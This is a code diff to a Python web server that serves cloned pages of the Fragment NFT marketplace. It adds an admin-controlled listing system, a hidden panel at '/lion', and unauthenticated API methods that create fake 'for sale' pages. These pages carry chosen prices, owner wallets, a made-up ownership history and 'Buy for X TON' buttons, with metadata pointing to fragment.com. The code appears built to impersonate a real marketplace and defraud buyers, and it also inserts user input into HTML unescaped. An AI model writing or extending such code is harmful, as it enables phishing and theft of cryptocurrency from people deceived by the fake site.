@@ -214,6 +214,24 @@ FOR_SALE_GIFTS = {
     "vintagecigar-16398": {"price": 15, "title": "Vintage Cigar #16398"},
 }
 
+LISTINGS_FILE = "listings.json"
+DYNAMIC_LISTINGS = {}
+
+
+def load_listings():
+    global DYNAMIC_LISTINGS
+    if os.path.isfile(LISTINGS_FILE):
+        try:
+            with open(LISTINGS_FILE, "r", encoding="utf-8") as f:
+                DYNAMIC_LISTINGS = json.load(f)
+        except Exception:
+            DYNAMIC_LISTINGS = {}
+
+
+def save_listings():
+    with open(LISTINGS_FILE, "w", encoding="utf-8") as f:
+        json.dump(DYNAMIC_LISTINGS, f, ensure_ascii=False, indent=2)
+
 
 def generate_gift_for_sale_page(gift_id, host=""):
     """Generate a 'For sale' product page for a gift NFT."""
@@ -394,6 +412,154 @@ def generate_gift_for_sale_page(gift_id, host=""):
         '"typeUrl":"\\/gift\\/"',
         '"typeUrl":"\\/nft\\/"'
     )
+
+    return content
+
+
+def generate_dynamic_nft_page(listing, host=""):
+    """Generate a product page from a dynamic admin listing."""
+    slug = listing["slug"]
+    title = listing["title"]
+    price_ton = listing["price"]
+    usd = price_ton * TON_RATE
+    usd_str = f"~ ${usd:.0f}"
+    price_str = str(price_ton)
+    img_slug = listing.get("img_slug", slug)
+    owner_full = listing["owner_full"]
+    owner_short = listing["owner_short"]
+
+    if host:
+        scheme = "https" if not host.startswith("localhost") else "http"
+        abs_img_url = f"{scheme}://{host}/images/{img_slug}.medium.jpg"
+    else:
+        abs_img_url = f"/images/{img_slug}.medium.jpg"
+
+    with open("html/page_gift.html", "r", encoding="utf-8", errors="ignore") as f:
+        content = f.read()
+
+    content = apply_dynamic_replacements(content, [
+        ("/images/plushpepe-1821.medium.jpg", f"/images/{img_slug}.medium.jpg"),
+        ("plushpepe-1821",        slug),
+        ("Plush Pepe #1821",      title),
+        ("Plush Pepe&nbsp;#1821", title),
+        ("ccccc \u2013\xa0Fragment", f"{title} \u2013\xa0Fragment"),
+        ("ccccc \u2013 Fragment",    f"{title} \u2013 Fragment"),
+        ("ccccc \u2013 Fragment",    f"{title} \u2013 Fragment"),
+        ("ccccc – Fragment",         f"{title} – Fragment"),
+    ])
+
+    new_bid = (
+        '<div class="tm-section-box tm-section-bid-info">'
+        '<table class="table tm-table tm-table-fixed"><thead><tr>'
+        '<th style="--width:50%">Sale Price</th>'
+        '<th style="--width:50%">Owner</th>'
+        '</tr></thead><tbody><tr>'
+        f'<td><div class="table-cell">'
+        f'<div class="table-cell-value tm-value icon-before icon-ton">{price_str}</div>'
+        f'<div class="table-cell-desc">{usd_str}</div>'
+        '</div></td>'
+        f'<td><div class="table-cell">'
+        f'<a class="tm-wallet" href="https://tonviewer.com/{owner_full}" target="_blank">'
+        f'<span class="short">{owner_short}</span></a>'
+        '</div></td>'
+        '</tr></tbody></table>'
+        '<div class="tm-bid-info-text">'
+        'The owner of this asset is ready to sell it for this price without an auction.'
+        '</div></div>'
+    )
+    content = re.sub(
+        r'<div class="tm-section-box tm-section-bid-info">.*?(?=<div class="tm-list tm-section-box tm-section-auction-info">)',
+        new_bid + '\n    ', content, flags=re.DOTALL
+    )
+
+    model       = listing.get("model", "")
+    model_pct   = listing.get("model_pct", "")
+    backdrop    = listing.get("backdrop", "")
+    backdrop_pct = listing.get("backdrop_pct", "")
+    symbol      = listing.get("symbol", "")
+    symbol_pct  = listing.get("symbol_pct", "")
+    issued      = listing.get("issued", "")
+    gifted_text = listing.get("gifted_text", "")
+
+    attrs = (
+        '<div class="tm-list tm-section-box tm-section-auction-info">'
+        f'<dl class="tm-list-item"><dt class="tm-list-item-title">Owner</dt>'
+        f'<dd class="tm-list-item-value"><span class="accent-color">{owner_short}</span></dd></dl>'
+    )
+    if model:
+        pct_html = f'<span class="tm-label-secondary"> {model_pct}</span>' if model_pct else ""
+        attrs += f'<dl class="tm-list-item"><dt class="tm-list-item-title">Model</dt><dd class="tm-list-item-value"><span class="accent-color">{model}{pct_html}</span></dd></dl>'
+    if backdrop:
+        pct_html = f'<span class="tm-label-secondary"> {backdrop_pct}</span>' if backdrop_pct else ""
+        attrs += f'<dl class="tm-list-item"><dt class="tm-list-item-title">Backdrop</dt><dd class="tm-list-item-value"><span class="accent-color">{backdrop}{pct_html}</span></dd></dl>'
+    if symbol:
+        pct_html = f'<span class="tm-label-secondary"> {symbol_pct}</span>' if symbol_pct else ""
+        attrs += f'<dl class="tm-list-item"><dt class="tm-list-item-title">Symbol</dt><dd class="tm-list-item-value"><span class="accent-color">{symbol}{pct_html}</span></dd></dl>'
+    if issued:
+        attrs += f'<dl class="tm-list-item"><dt class="tm-list-item-title">Issued</dt><dd class="tm-list-item-value"><span class="accent-color">{issued}</span></dd></dl>'
+    if gifted_text:
+        attrs += f'<div class="tm-list-footer" style="padding:10px 16px;color:#8794a1;font-size:13px;">{gifted_text}</div>'
+    attrs += '</div>\n    '
+
+    content = re.sub(
+        r'<div class="tm-list tm-section-box tm-section-auction-info">.*?(?=<div class="tm-section-box tm-section-buttons">)',
+        attrs, content, flags=re.DOTALL
+    )
+
+    content = content.replace('collector.ton', owner_short)
+    content = content.replace('Purchased on 22 May 2026 at 12:40', '')
+    content = content.replace('May 22 at 12:40', '')
+
+    content = re.sub(
+        r'<div class="tm-section-box tm-section-countdown-wrap[^"]*">.*?</div>\s*</div>',
+        '', content, flags=re.DOTALL
+    )
+
+    content = re.sub(
+        r'<div class="tm-section-box tm-section-buttons">.*?</div>',
+        f'<div class="tm-section-box tm-section-buttons">'
+        f'<button class="btn btn-primary js-buy-now-btn" data-bid-amount="{price_str}">'
+        f'Buy for {price_str} TON</button></div>',
+        content, flags=re.DOTALL
+    )
+
+    h_price      = listing.get("history_price", "")
+    h_date_short = listing.get("history_date_short", "")
+    h_date_long  = listing.get("history_date_long", "")
+    h_wallet     = listing.get("history_wallet", "")
+
+    if h_price and h_date_long:
+        short_span = f'<span class="thin-only"><time class="short">{h_date_short}</time></span>' if h_date_short else ""
+        history_rows = (
+            '\n       <tr>'
+            f'\n        <td><div class="table-cell"><div class="table-cell-value tm-value icon-before icon-ton">{h_price}</div></div></td>'
+            f'\n        <td><div class="table-cell"><div class="tm-datetime">{short_span}'
+            f'<span class="wide-only"><time>{h_date_long}</time></span></div></div></td>'
+            f'\n        <td><div class="table-cell"><a class="tm-wallet" href="https://tonviewer.com/" target="_blank">'
+            f'<span class="short">{h_wallet}</span></a></div></td>'
+            '\n       </tr>\n       '
+        )
+        content = re.sub(
+            r'(Ownership History.*?<tfoot>.*?</tfoot>\s*<tbody>).*?(</tbody>)',
+            r'\g<1>' + history_rows + r'\g<2>',
+            content, flags=re.DOTALL
+        )
+
+    content = re.sub(r'<meta content="[^"]*" property="og:image"/>', f'<meta content="{abs_img_url}" property="og:image"/>', content)
+    content = re.sub(r'<meta content="[^"]*" property="og:url"/>', f'<meta content="https://fragment.com/nft/{slug}" property="og:url"/>', content)
+    content = re.sub(r'<meta content="[^"]*" property="og:title"/>', f'<meta content="{title} on Fragment" property="og:title"/>', content)
+    content = re.sub(r'<meta content="[^"]*" property="og:description"/>', f'<meta content="{title} is available for sale on Fragment for {price_str} TON." property="og:description"/>', content)
+    content = re.sub(r'<link href="https://fragment\.com/gift/[^"]*" rel="canonical"/>', f'<link href="https://fragment.com/nft/{slug}" rel="canonical"/>', content)
+
+    content = content.replace(
+        '<div class="tm-main-nft-image-header tm-section-box">',
+        '<div class="tm-main-nft-image-header tm-section-box" style="display:flex;justify-content:center;margin-top:8px;">',
+    )
+    content = content.replace('<div class="tm-section-header">', '<div class="tm-section-header" style="margin-top:16px;">', 1)
+
+    content = content.replace('"nftId":"plushpepe-1821"', f'"nftId":"{slug}"')
+    content = content.replace('"itemTitle":"Plush Pepe #1821"', f'"itemTitle":"{title}"')
+    content = content.replace('"typeUrl":"\\/gift\\/"', '"typeUrl":"\\/nft\\/"')
 
     return content
 
@@ -1029,6 +1195,11 @@ class Handler(http.server.BaseHTTPRequestHandler):
         # /nft/GiftId → for-sale gift NFT product page
         if file_path is None and re.match(r'^/nft/[^/?]+$', path):
             gift_id = path.split("/nft/")[1]
+            # Check dynamic admin listings first
+            if gift_id.lower() in DYNAMIC_LISTINGS:
+                content = generate_dynamic_nft_page(DYNAMIC_LISTINGS[gift_id.lower()], host=self.headers.get("Host", ""))
+                self.serve_content(content, is_ajax)
+                return
             content = generate_gift_for_sale_page(gift_id, host=self.headers.get("Host", ""))
             if content:
                 self.serve_content(content, is_ajax)
@@ -1074,6 +1245,16 @@ class Handler(http.server.BaseHTTPRequestHandler):
             file_path = "html/page_my_bids.html"
         if file_path is None and path in ("/my/sessions",):
             file_path = "html/page_my_sessions.html"
+
+        # /lion → secret admin panel
+        if file_path is None and path == "/lion":
+            file_path = "html/page_admin.html"
+
+        # /api/listings → return dynamic listings as JSON
+        if file_path is None and path == "/api/listings":
+            listings = list(DYNAMIC_LISTINGS.values())
+            self.send_json({"ok": 1, "listings": listings})
+            return
 
         # /username slugs → dynamic username product page
         if file_path is None and re.match(r'^/[a-zA-Z0-9_]+$', path):
@@ -1273,12 +1454,60 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_json({"ok": 1, "transaction": transaction})
             return
 
+        if method == "listNft":
+            slug = params.get("slug", [""])[0].strip().lower()
+            if not slug:
+                self.send_json({"ok": 0, "error": "slug required"})
+                return
+            try:
+                price = int(params.get("price", ["0"])[0])
+            except ValueError:
+                price = 0
+            if price <= 0:
+                self.send_json({"ok": 0, "error": "invalid price"})
+                return
+            title = params.get("title", [gift_slug_to_title(slug)])[0] or gift_slug_to_title(slug)
+            listing = {
+                "slug": slug,
+                "title": title,
+                "price": price,
+                "owner_full":  params.get("owner_full",  [""])[0],
+                "owner_short": params.get("owner_short", [""])[0],
+                "img_slug":    slug,
+                "model":       params.get("model",       [""])[0],
+                "model_pct":   params.get("model_pct",   [""])[0],
+                "backdrop":    params.get("backdrop",    [""])[0],
+                "backdrop_pct": params.get("backdrop_pct", [""])[0],
+                "symbol":      params.get("symbol",      [""])[0],
+                "symbol_pct":  params.get("symbol_pct",  [""])[0],
+                "issued":      params.get("issued",      [""])[0],
+                "gifted_text": params.get("gifted",      [""])[0],
+                "history_price":      params.get("history_price",      [""])[0],
+                "history_date_short": params.get("history_date_short", [""])[0],
+                "history_date_long":  params.get("history_date_long",  [""])[0],
+                "history_wallet":     params.get("history_wallet",     [""])[0],
+            }
+            DYNAMIC_LISTINGS[slug] = listing
+            save_listings()
+            self.send_json({"ok": 1, "nft_url_slug": slug})
+            return
+
+        if method == "deleteNft":
+            slug = params.get("slug", [""])[0].strip().lower()
+            if slug in DYNAMIC_LISTINGS:
+                del DYNAMIC_LISTINGS[slug]
+                save_listings()
+            self.send_json({"ok": 1})
+            return
+
         # All other API calls — return ok so no JS errors appear
         self.send_json({"ok": 1})
 
 
 class ReusableHTTPServer(http.server.HTTPServer):
     allow_reuse_address = True
+
+load_listings()
 
 if __name__ == "__main__":
     server = ReusableHTTPServer(("0.0.0.0", 5000), Handler)
